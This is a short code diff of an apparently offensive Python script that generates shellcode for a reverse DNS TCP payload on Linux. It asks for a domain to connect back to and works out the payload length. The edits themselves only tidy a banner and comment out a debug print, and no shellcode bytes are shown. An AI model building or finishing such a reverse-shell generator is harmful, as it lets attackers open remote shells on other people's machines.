@@ -54,8 +54,8 @@ print """
 
 
 
-print "Hitriy Kotik (Tricky Cat) is my name and I like dealing in shellcode. I have something special in the market place for you! \n\n \
-!!!!! A Reverse DNS TCP Payload For Linux !!!!! \n\n Tell Me , a few things and I will generate the shellcode for you!"  
+print "Hitriy Kotik (Tricky Cat) is my name and I like dealing in shellcode. I have something special in the market place for you! \n\n\
+!!!!! A Reverse DNS TCP Payload For Linux !!!!! \n\nTell Me , a few things and I will generate the shellcode for you!"  
 
 
 domainname = raw_input("[+] Tell Me The Domain You Wish To Connect Back To : ")
@@ -80,7 +80,7 @@ AlmostEverythingIsLEndian = []
 lengthOfPayload = 22 + len(domainname.replace(".",""))
 
 #print "Length of DomainName :", lengthOfPayload
-print "Modulus % of Domain Name  " , (lengthOfPayload  % 8 )
+#print "Modulus % of Domain Name  " , (lengthOfPayload  % 8 )
 
 if (lengthOfPayload  % 8) == 0:
    # pass
